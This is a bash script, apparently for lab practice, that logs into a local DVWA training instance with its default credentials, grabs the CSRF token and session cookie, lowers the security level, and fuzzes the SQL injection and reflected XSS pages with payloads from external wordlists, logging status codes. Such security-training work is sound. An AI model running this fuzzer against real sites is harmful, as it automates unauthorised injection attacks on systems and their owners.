#!/bin/bash
TARGET="192.168.122.109"
BASE_URL="http://$TARGET/DVWA"
DVWA_USER="admin"
DVWA_PASS="password"
SQL_WORDLIST="SQL-Injection-Wordlist.txt"
# SQL_WORDLIST="SQL-Injection.txt"
XSS_WORDLIST="XSS-Wordlist.txt"
COOKIE_FILE="dvwa_cookies.txt"

echo "[*] Target: $BASE_URL"

# --- Login & Get Session ---
INIT_PAGE=$(curl -s -c $COOKIE_FILE "$BASE_URL/login.php")
USER_TOKEN=$(echo "$INIT_PAGE" | grep -oP '(?<=name="user_token" value=")[^"]*')
echo "[+] CSRF Token: $USER_TOKEN"

curl -s -b $COOKIE_FILE -c $COOKIE_FILE \
  -d "username=$DVWA_USER&password=$DVWA_PASS&user_token=$USER_TOKEN&Login=Login" \
  "$BASE_URL/login.php" >/dev/null

curl -s -b $COOKIE_FILE -c $COOKIE_FILE \
  -d "security=low&seclev_submit=Submit" \
  "$BASE_URL/security.php" >/dev/null

SESSION_ID=$(grep "PHPSESSID" $COOKIE_FILE | awk '{print $7}')
if [ -z "$SESSION_ID" ]; then
  echo "[!] Login failed."
  exit 1
fi
echo "[+] Session ID: $SESSION_ID"
COOKIE_STR="security=low; PHPSESSID=$SESSION_ID"

# --- SQL Injection: ยิงทุก payload ใน wordlist ---
echo "[*] Starting SQL Injection fuzzing..."
>sql_results.txt
while IFS= read -r PAYLOAD; do
  ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$PAYLOAD'''))")
  RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" \
    -b "$COOKIE_STR" \
    "$BASE_URL/vulnerabilities/sqli/?id=${ENCODED}&Submit=Submit")
  echo "[SQLi] Payload: $PAYLOAD | Status: $RESPONSE" | tee -a sql_results.txt
done <"$SQL_WORDLIST"

# --- XSS: ยิงทุก payload ใน wordlist ---

echo "[*] Starting XSS fuzzing..."
>xss_results.txt
while IFS= read -r PAYLOAD; do
  ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$PAYLOAD'''))")
  RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" \
    -b "$COOKIE_STR" \
    "$BASE_URL/vulnerabilities/xss_r/?name=${ENCODED}")
  echo "[XSS] Payload: $PAYLOAD | Status: $RESPONSE" | tee -a xss_results.txt
done <"$XSS_WORDLIST"

echo "[*] Done. Results: sql_results.txt / xss_results.txt"
rm -f $COOKIE_FILE

